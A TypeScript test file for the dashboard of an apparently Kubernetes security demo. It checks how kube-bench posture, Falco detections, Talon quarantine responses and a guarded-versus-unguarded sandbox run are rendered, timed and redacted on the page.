    expect([...(legend?.querySelectorAll(".legend li") ?? [])].map((li) => li.textContent)).toEqual(["Pass69", "Fail0", "Manual / warn2", "Info0", "Not applicable3"]);
    expect(legend?.querySelector(".stack")?.getAttribute("aria-label")).toContain("3 Not applicable");
    // An older API counts them in Info: no segment, no group.
    const old = renderPostureData({ ...p, kube_bench: { last_run: null, pass: 59, fail: 3, warn: 12, info: 14 } }, T);
    expect(old.textContent).not.toContain("Not applicable");
    expect(old.querySelector("details.tile__group")).toBeNull();
  });

  it("tiles list five groups or checks, then point at the rest; the violations table scrolls in its box", () => {
    const p = withViolations(Array.from({ length: 7 }, () => ({ running: null, count: 1 })));
    const failing = Array.from({ length: 7 }, (_, i) => ({ id: `1.1.${i + 1}`, title: `check ${i}`, remediation: "r" }));
    const el = renderPostureData({ ...p, kube_bench: { ...p.kube_bench, failing } }, 0);
    const [adm, , cis] = [...el.querySelectorAll(".tile")];
    expect(adm.querySelectorAll(".tile__list > li:not(.tile__more)")).toHaveLength(5);
    expect(adm.querySelector(".tile__more")?.textContent).toBe("2 more in the table below");
    expect(cis.querySelectorAll(".tile__list > li:not(.tile__more)")).toHaveLength(5);
    expect(cis.querySelector(".tile__more")?.textContent).toBe("2 more: 1.1.6, 1.1.7");
    expect(el.querySelector(".table-scroll > table.data-table--wrap")?.textContent).toContain("autogen-validate-registries");
  });

  it("console and shop-window times are Polish time with ms", async () => {
    const api = new ApiClient({ fetch: async () => new Response("{}", { status: 404, headers: { "Content-Type": "application/json" } }) });
    const root = document.createElement("section");
    document.body.append(root);
    const evs = [...scripted(1), ev("pod", { run_id: "0f0e0d0c0b0a0908", pod: POD, uid: "u", phase: "Running", reason: "", container_id: "9b2e7c4d1a0f", image: GOOD, labels_delta: {}, deleted: false, at: at(100) }, 60), ev("victim", { run_id: "0f0e0d0c0b0a0908", pod: POD, at: at(200), status: "up", title: "SDP Shop", banner: "", probe_ms: 3, checksum: "" }, 61)];
    mountConsole(root, api).update(buildTimeline(evs, T + 4000));
    expect(root.querySelector(".phase time")?.textContent).toMatch(/^(\d{4}-\d\d-\d\d )?\d\d:\d\d:\d\d\.\d{3} CEST$/);
    expect(root.textContent).toMatch(/seen (\d{4}-\d\d-\d\d )?\d\d:\d\d:\d\d\.\d{3} CEST/);
  });

  it("the verify panel is not redrawn for a new generated_at, only when what it shows changes", () => {
    const panel = document.createElement("div");
    const v = mountVerify(panel);
    const prov = (g: string, commit = "0448cff") => ({ generated_at: g, api: { commit, ci_run_id: "1", images: [] }, web: { images: [] } });
    v.set({ provenance: prov("2026-10-03T18:00:00Z") });
    const first = panel.firstElementChild;
    expect(first?.textContent).toContain("0448cff");
    v.set({ provenance: prov("2026-10-03T18:01:00Z") });
    expect(panel.firstElementChild).toBe(first);
    v.set({ provenance: prov("2026-10-03T18:02:00Z", "1234abc") });
    expect(panel.firstElementChild).not.toBe(first);
    expect(panel.textContent).toContain("1234abc");
  });

  it("provenance: a failure keeps the last good answer; a 404 is asked again after 10 minutes", async () => {
    vi.useFakeTimers();
    try {
      const seq: Result<Provenance>[] = [
        { ok: true, value: { api: { commit: "", ci_run_id: "", images: [] }, web: { images: [] } } },
        { ok: false, error: "offline", message: "HTTP 503", status: 503 },
      ];
      const calls = { data: 0, unavailable: 0, loads: 0 };
      pollProvenance(async () => (calls.loads++, seq.shift() ?? { ok: false, error: "offline", message: "x", status: 503 }), { data: () => calls.data++, unavailable: () => calls.unavailable++ });
      await vi.advanceTimersByTimeAsync(61_000);
      expect(calls).toEqual({ data: 1, unavailable: 0, loads: 2 });
      const missing = { n: 0, unavailable: 0 };
      pollProvenance(async () => (missing.n++, { ok: false, error: "offline", message: "HTTP 404", status: 404, json: true }), { data: () => {}, unavailable: () => missing.unavailable++ });
      await vi.advanceTimersByTimeAsync(9 * 60_000);
      expect(missing.n).toBe(1);
      await vi.advanceTimersByTimeAsync(61_000);
      expect(missing.n).toBe(2);
    } finally {
      vi.useRealTimers();
    }
  });

  describe("mountEvidence redraws nothing a tick or the clock does not change", () => {
    const mount = () => {
      const card = document.createElement("div");
      const section = { ticker: document.createElement("div"), liveness: document.createElement("p"), detail: document.createElement("div"), announce: document.createElement("p") };
      document.body.append(card, section.ticker, section.announce);
      return { card, section, ev: mountEvidence(card, section, () => {}) };
    };

    it("ticks and repeated views leave the ticker's child list alone; new items are spoken once", () => {
      const { section, ev: e } = mount();
      const view = buildTimeline(scripted(1), Date.now());
      e.setConnection("open");
      e.update(view);
      e.tick({ at: new Date().toISOString() });
      const obs = new MutationObserver(() => {});
      obs.observe(section.ticker, { childList: true, subtree: true });
      e.update(view);
      e.tick({ at: new Date(Date.now() + 15_000).toISOString() });
      e.setConnection("open");
      expect(obs.takeRecords().filter((r) => r.type === "childList")).toEqual([]);
      expect(section.announce.textContent).toBe("");
      e.update(buildTimeline(scripted(2), Date.now()));
      expect(obs.takeRecords().some((r) => r.type === "childList")).toBe(true);
      expect(section.announce.textContent).toBe("New event: Falco: Rule 1");
      obs.disconnect();
    });

    it("folded (#evidence collapsed): the card is drawn, the ticker is not; unfolded, the ticker catches up and announces nothing", () => {
      const { card, section, ev: e } = mount();
      e.setConnection("open");
      e.update(buildTimeline(scripted(1), Date.now()));
      e.tick({ at: new Date().toISOString() });
      e.setActive(false);
      const obs = new MutationObserver(() => {});
      obs.observe(section.ticker, { childList: true, subtree: true });
      e.update(buildTimeline(scripted(2), Date.now()));
      expect(obs.takeRecords()).toEqual([]);
      expect(card.querySelectorAll(".evlist__item")).toHaveLength(3);
      e.setActive(true);
      expect(section.ticker.textContent).toContain("Rule 1");
      expect(section.announce.textContent).toBe("");
      obs.disconnect();
    });

    it("the 30 s refresh keeps the card and a focused link in it, and updates the relative text", () => {
      vi.useFakeTimers();
      try {
        vi.setSystemTime(T + 4000);
        const { card, ev: e } = mount();
        e.update(buildTimeline(scripted(1), T + 4000));
        const link = card.querySelector("a") as HTMLAnchorElement;
        link.focus();
        const before = card.querySelector(".evcard__when")?.textContent;
        vi.advanceTimersByTime(30_000);
        expect(card.querySelector("a")).toBe(link);
        expect(document.activeElement).toBe(link);
        expect(card.querySelector(".evcard__when")?.textContent).not.toBe(before);
      } finally {
        vi.useRealTimers();
      }
    });
  });
});

describe("a side-by-side run on the card, in the history and in the console (ADR 0031)", () => {
  const R = "0a0b0c0d0e0f1011";
  const UPOD = "scenario-network-tool-abc-u";
  const runEv = (state: string, ms: number, extra: Record<string, unknown> = {}) => ev("run", { run_id: R, scenario: "network-tool", state, at: at(ms), ...extra });
  const sideBySide = (end: boolean, ns = "sandbox-unguarded"): StreamEvent[] => [
    runEv("queued", 0),
    runEv("started", 50, { pods: { guarded: POD, unguarded: UPOD } }),
    ev("falco", { at: at(1000), rule: "SDP network tool in sandbox", priority: "Warning", namespace: "sandbox", pod: POD, output: "o", arm: "guarded" }),
    runEv("detected", 1005, { detail: "SDP network tool in sandbox" }),
    ev("falco", { at: at(1010), rule: "SDP network tool in sandbox", priority: "Warning", namespace: ns, pod: UPOD, output: "o", arm: "unguarded" }),
    ev("talon", { at: at(1100), action: "Quarantine Pod", actionner: "kubernetes:label", namespace: "sandbox", pod: POD, status: "success", output: "labeled", arm: "guarded" }),
    runEv("responded", 1110, { detail: "quarantine" }),
    ...(end ? [runEv("finished", 3000)] : []),
  ];
  const view = (end: boolean, ns?: string) => buildTimeline(sideBySide(end, ns), T + 2000);

  it("names the guarded pod once the twin's Falco event (sandbox-unguarded) is in; any other namespace still hides it", () => {
    const run = view(true).runs[0];
    expect(run.falco).toHaveLength(2);
    expect(publishedPod(run)).toBe(POD);
    const pod = (el: HTMLElement) => [...el.querySelectorAll("dt")].find((d) => d.textContent === "Pod")?.nextElementSibling?.textContent;
    expect(pod(renderEvidenceCard(run, { title: "x", now: T + 4000 }))).toBe(POD);
    expect(pod(renderEvidenceDetail(run, { title: "x", now: T + 4000 }))).toBe(POD);
    const attack = renderRun(run, "x", new Set(), undefined, undefined, undefined, T + 4000).querySelector(".stage--attack") as HTMLElement;
    expect(attack.textContent).toContain(POD);
    expect(attack.textContent).not.toContain("not a sandbox pod");
    const other = view(true, "portfolio-api").runs[0];
    expect(publishedPod(other)).toBeUndefined();
    expect(renderEvidenceCard(other, { title: "x", now: T + 4000 }).textContent).not.toContain(POD);
    const hidden = renderRun(other, "x", new Set(), undefined, undefined, undefined, T + 4000).querySelector(".stage--attack") as HTMLElement;
    expect(hidden.textContent).not.toContain(POD);
    expect(hidden.textContent).toContain("pod name withheld: not a sandbox pod");
    expect(hidden.textContent).not.toContain("outside the sandbox");
  });

  it("labels each Falco/Talon event with its pod, from the namespace; an unknown namespace gets no label", () => {
    const card = renderEvidenceCard(view(true).runs[0], { title: "x", now: T + 4000 });
    const items = [...card.querySelectorAll(".evlist__item")];
    expect(items.map((i) => i.querySelector(".tag--arm")?.textContent)).toEqual(["guarded", "twin, unguarded", "guarded"]);
    expect(items.map((i) => i.querySelector(".tag--arm")?.getAttribute("data-arm"))).toEqual(["guarded", "unguarded", "guarded"]);
    expect(items[1].textContent).toBe(`falco twin, unguarded SDP network tool in sandbox (Warning) at 20:01:58.133 CEST`);
    const detail = renderEvidenceDetail(view(true).runs[0], { title: "x", now: T + 4000 });
    expect([...detail.querySelectorAll(".tag--arm")].map((t) => t.textContent)).toEqual(["guarded", "twin, unguarded", "guarded"]);
    for (const ns of ["portfolio-api", "constructor", "__proto__", ""]) {
      const other = renderEvidenceCard(view(true, ns).runs[0], { title: "x", now: T + 4000 });
      expect(other.querySelectorAll(".tag--arm")).toHaveLength(2);
      expect(other.querySelectorAll(".evlist__item")[1].querySelector(".tag--arm")).toBeNull();
    }
  });

  it("the header follows the run's state, as the chip does", () => {
    const card = (events: StreamEvent[]) => renderEvidenceCard(buildTimeline(events, T + 2000).runs[0], { title: "x", now: T + 2000 });
    const head = (el: HTMLElement) => [el.querySelector(".evcard__eyebrow")?.textContent, el.querySelector(".evcard__head .chip")?.textContent];
    // Contained, the run not over yet (the twin is still held): no longer "in progress".
    const contained = card(sideBySide(false));
    expect(buildTimeline(sideBySide(false), T + 2000).runs[0].active).toBe(true);
    expect(head(contained)).toEqual(["Attack contained", "Contained"]);
    expect(head(card(sideBySide(true)))).toEqual(["Latest attack, as recorded", "Finished"]);
    // Detected, not yet answered: still in progress.
    expect(head(card(sideBySide(false).slice(0, 4)))).toEqual(["Attack in progress", "Detected"]);
    expect(head(card([...sideBySide(false).slice(0, 4), runEv("failed", 1500, { detail: "x" })]))).toEqual(["Latest attack, as recorded", "Failed"]);
  });

  it("the console names the pod only where the page may publish it", async () => {
    const api = new ApiClient({ fetch: async () => new Response("{}", { status: 404, headers: { "Content-Type": "application/json" } }) });
    const consoleOf = (ns?: string) => {
      const root = document.createElement("section");
      document.body.append(root);
      mountConsole(root, api).update(view(true, ns));
      return root;
    };
    const twin = consoleOf();
    expect(twin.querySelector(".console__sub")?.textContent).toContain(`pod ${POD}`);
    expect(twin.querySelector(".verify")?.textContent).toContain(POD);
    const other = consoleOf("portfolio-api");
    expect(other.querySelector(".console__sub")?.textContent).not.toContain(POD);
    expect(other.querySelector(".verify")?.textContent).not.toContain(POD);
    expect(twin.querySelector(".card--pod")?.textContent).toContain(POD);
    expect(other.querySelector(".card--pod")?.textContent).not.toContain(POD);
  });
});
